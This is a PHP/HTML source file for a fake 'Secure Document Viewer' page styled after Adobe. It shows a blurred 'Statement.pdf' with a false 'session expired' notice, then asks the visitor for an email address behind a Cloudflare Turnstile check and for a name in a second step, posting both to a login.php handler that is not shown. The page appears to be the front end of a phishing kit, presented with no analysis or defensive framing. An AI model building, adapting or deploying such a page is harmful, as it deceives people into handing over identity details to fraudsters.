<?php
session_start();

// Step control
$step = $_SESSION['step'] ?? 1;

// Old email
$old_email = $_SESSION['old_email'] ?? '';
$error     = $_SESSION['error_message'] ?? '';
unset($_SESSION['error_message']);

$hasError = !empty($error);

// Hide "session expired" message if this specific error shows
$hideSessionMsg = ($error === 'Incorrect name entered.');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Document Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Cloudflare Turnstile -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

    <style>
        *, *::before, *::after { box-sizing: border-box; }

        /* -------------------------------------------
           Adobe-style theme tokens
        -------------------------------------------- */
        :root {
            --card-bg: #fff;
            --text-color: #222;
            --subtext: #6b6b6b;
            --border: #d4d4d4;
            --btn-bg: #1473e6;
            --btn-hover: #0f5cc0;
            --error: #c9252d;
            --overlay-dark: rgba(0,0,0,0.65);
            --readonly-bg: #fefefe;
            --divider: #e8e8e8;
            --font-xs: 11px;
            --font-sm: 12px;
            --font-btn: 12px;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --card-bg: #1e1e1f;
                --text-color: #f3f3f3;
                --subtext: #999;
                --border: #333;
                --btn-bg: #4a8fff;
                --btn-hover: #3a73d0;
                --readonly-bg: #2a2d35;
                --divider: #2c2c2c;
            }
        }

        body {
            margin: 0;
            font-family: "Segoe UI", system-ui, sans-serif;
            background: #111;
            color: var(--text-color);
            min-height: 100vh;
        }

        .page-wrapper {
            position: relative;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .page-wrapper::before {
            content: "";
            position: absolute;
            inset: 0;
            background: var(--overlay-dark);
        }

        .doc-background {
            position: absolute;
            inset: 0;
            filter: blur(6px);
            opacity: 0.7;
            transform: scale(1.04);
        }

        .doc-background img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        /* -------------------------------------------
           CARD
        -------------------------------------------- */
        .login-card {
            width: 95%;
            max-width: 320px;
            background: var(--card-bg);
            border-radius: 4px;
            padding: 18px 20px 22px;
            border: 1px solid #d0d0d0;
            box-shadow: 0 10px 24px rgba(0,0,0,0.26);
            z-index: 2;

            opacity: 0;
            transform: translateY(14px) scale(0.985);
            animation: fadeIn 0.45s ease-out forwards;
        }

        .login-card.has-error {
            border-color: rgba(201,37,45,0.5);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px) scale(0.97); }
            to   { opacity: 1; transform: translateY(0) scale(1); }
        }

        .top-divider {
            height: 1px;
            background: var(--divider);
            margin: 8px 0 12px;
        }

        /* -------------------------------------------
           HEADER
        -------------------------------------------- */
        .doc-icon {
            width: 38px;
            height: 38px;
            margin: 0 auto 6px;
        }
        .doc-icon-img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .doc-title {
            text-align: center;
            font-size: 14px;
            margin-bottom: 2px;
            font-weight: 600;
        }
        .doc-size {
            color: var(--subtext);
            font-size: var(--font-xs);
        }

        .doc-subtitle {
            text-align: center;
            color: var(--error);
            font-size: var(--font-xs);
            margin-bottom: 6px;
            font-weight: 600;
        }

        .login-error {
            color: var(--error);
            font-size: var(--font-xs);
            text-align: center;
            margin-bottom: 8px;
            font-weight: 600;
        }

        /* -------------------------------------------
           FIELDS
        -------------------------------------------- */
        .field-wrapper {
            margin-bottom: 9px;
            position: relative;
        }

        .field-wrapper input {
            width: 100%;
            padding: 8px 9px;
            font-size: var(--font-sm);
            border: 1px solid var(--border);
            border-radius: 3px;
            background: #fefefe;
            outline: none;
            color: var(--text-color);
        }

        .field-wrapper input:focus {
            border-color: var(--btn-bg);
            box-shadow: 0 0 0 1px rgba(20,115,230,0.22);
            background: #ffffff;
        }

        /* Email typing always black (even in dark mode) */
        input[type="email"] {
            color: #000 !important;
        }

        /* Step 2 email – visually normal but readonly */
        .readonly-email {
            background: var(--readonly-bg);
            cursor: text;
        }

        /* -------------------------------------------
           EMAIL ICON
        -------------------------------------------- */
        .email-wrapper input {
            padding-left: 28px; /* room for icon */
        }

        .email-icon {
            position: absolute;
            left: 9px;
            top: 50%;
            transform: translateY(-50%);
            width: 14px;
            height: 14px;
            opacity: 0.7;
            pointer-events: none;
        }
        .email-icon path {
            fill: #777;
        }

        /* -------------------------------------------
           NAME LOCK ICON
        -------------------------------------------- */
        .lock-icon {
            position: absolute;
            right: 9px;
            top: 50%;
            transform: translateY(-50%);
            width: 13px;
            height: 13px;
            opacity: 0.65;
            pointer-events: none;
        }
        .lock-icon path {
            fill: #777;
        }

        /* -------------------------------------------
           CAPTCHA
        -------------------------------------------- */
        .captcha-wrapper {
            display: flex;
            justify-content: center;
            margin: 6px 0 4px;
        }

        .cf-turnstile {
            transform: scale(0.9);
            transform-origin: center;
        }

        /* -------------------------------------------
           BUTTON
        -------------------------------------------- */
        .btn-primary {
            width: 100%;
            padding: 9px 10px;
            background: var(--btn-bg);
            color: #fff;
            border: none;
            border-radius: 3px;
            font-size: var(--font-btn);
            font-weight: 600;
            cursor: pointer;
            margin-top: 4px;
        }

        .btn-primary:hover {
            background: var(--btn-hover);
        }
    </style>
</head>
<body>

<div class="page-wrapper">
    <div class="doc-background">
        <img src="assets/background.png" alt="Document preview">
    </div>

    <div class="login-card<?= $hasError ? ' has-error' : '' ?>">

        <div class="doc-icon">
            <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
        </div>

        <h2 class="doc-title">
            Statement.pdf <span class="doc-size">(197 KB)</span>
        </h2>

        <?php if (!$hideSessionMsg): ?>
            <p class="doc-subtitle">Previous session has expired, login to continue.</p>
        <?php endif; ?>

        <div class="top-divider"></div>

        <?php if ($error): ?>
            <p class="login-error"><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>

        <?php if ($step == 1): ?>
            <!-- STEP 1 — EMAIL + CAPTCHA -->
            <form method="POST" action="login.php">

                <div class="field-wrapper email-wrapper">
                    <input
                        type="email"
                        name="email"
                        placeholder="Enter your email"
                        value="<?= htmlspecialchars($old_email) ?>"
                        required
                    >
                    <!-- subtle mail icon -->
                    <svg class="email-icon" viewBox="0 0 16 16" aria-hidden="true">
                        <path d="M2 3.5h12c.55 0 1 .45 1 1v7c0 .55-.45 1-1 1H2c-.55 0-1-.45-1-1v-7c0-.55.45-1 1-1zm.7 1.2 4.65 3.2c.4.28.9.28 1.3 0l4.65-3.2H2.7zm10.6 6.8v-5.1l-3.9 2.7c-.9.63-2.1.63-3 0l-3.9-2.7v5.1h10.8z"/>
                    </svg>
                </div>

                <div class="captcha-wrapper">
                    <div class="cf-turnstile"
                         data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
                </div>

                <button class="btn-primary">Next</button>
            </form>

        <?php else: ?>
            <!-- STEP 2 — EMAIL DISPLAY + NAME WITH LOCK ICON -->
            <form method="POST" action="login.php">

                <div class="field-wrapper email-wrapper">
                    <input
                        type="email"
                        value="<?= htmlspecialchars($old_email) ?>"
                        class="readonly-email"
                        readonly
                    >
                    <!-- same subtle mail icon -->
                    <svg class="email-icon" viewBox="0 0 16 16" aria-hidden="true">
                        <path d="M2 3.5h12c.55 0 1 .45 1 1v7c0 .55-.45 1-1 1H2c-.55 0-1-.45-1-1v-7c0-.55.45-1 1-1zm.7 1.2 4.65 3.2c.4.28.9.28 1.3 0l4.65-3.2H2.7zm10.6 6.8v-5.1l-3.9 2.7c-.9.63-2.1.63-3 0l-3.9-2.7v5.1h10.8z"/>
                    </svg>
                </div>

                <div class="field-wrapper">
                    <input
                        type="text"
                        name="name"
                        placeholder="Enter your name"
                        required
                    >
                    <!-- tiny lock icon for name field -->
                    <svg class="lock-icon" viewBox="0 0 16 16" aria-hidden="true">
                        <path d="M5.5 7V5.5a2.5 2.5 0 0 1 5 0V7h.5A1.5 1.5 0 0 1 12.5 8.5v4A1.5 1.5 0 0 1 11 14H5a1.5 1.5 0 0 1-1.5-1.5v-4A1.5 1.5 0 0 1 5 7h.5Zm1 0h3V5.5a1.5 1.5 0 0 0-3 0V7Z"/>
                    </svg>
                </div>

                <button class="btn-primary">Next</button>
            </form>
        <?php endif; ?>
    </div>
</div>

</body>
</html>
